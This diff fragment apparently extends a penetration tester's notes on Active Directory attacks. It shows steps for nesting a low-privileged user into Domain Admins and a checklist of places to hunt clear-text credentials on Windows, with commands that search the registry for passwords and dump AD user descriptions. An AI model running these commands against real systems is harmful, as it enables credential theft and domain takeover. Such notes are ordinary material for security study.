@@ -305,3 +305,17 @@
           Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
           //add our low-privileged AD user to the first group
           Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
+      #### Got credential
+        clear-text
+          commands history, C:\Users\xxUSER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+          Configuration files (Web App, FTP files, etc.)
+          Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
+          Backup files
+          Shared files and folders
+          Registry
+          Source code 
+          Window registry       reg query HKLM /f password(keyword) /t REG_SZ /s
+          Password Managers
+          Memory Dump
+          Active Directory  
+            Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description  //in the description
